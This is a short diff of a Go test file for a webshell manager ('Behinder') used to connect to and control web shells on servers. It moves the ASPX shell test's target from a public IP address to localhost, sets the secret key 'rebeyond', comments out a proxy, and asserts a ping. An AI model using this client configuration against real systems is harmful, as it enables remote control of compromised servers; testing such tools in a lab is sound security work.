@@ -105,11 +105,12 @@ func TestNewWebJSPShell_B3(t *testing.T) {
 
 func TestNewWebASPXShell(t *testing.T) {
 
-	url := "http://47.120.44.219:8087/decrypt.aspx"
+	//url := "http://47.120.44.219:8087/decrypt.aspx"
+	url := "http://127.0.0.1:8087/decrypt.aspx"
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
 		SetShellScript("aspx"),
-		SetProxy("http://127.0.0.1:9999"),
+		//SetProxy("http://127.0.0.1:9999"),
 	)
 	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
 		jsonStr := `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
@@ -134,7 +135,7 @@ func TestNewWebASPXShell(t *testing.T) {
 		t.Error(err)
 		return
 	}
-	t.Logf("%v", ping)
+	assert.True(t, ping)
 }
 
 func TestNewWebPHPShell(t *testing.T) {
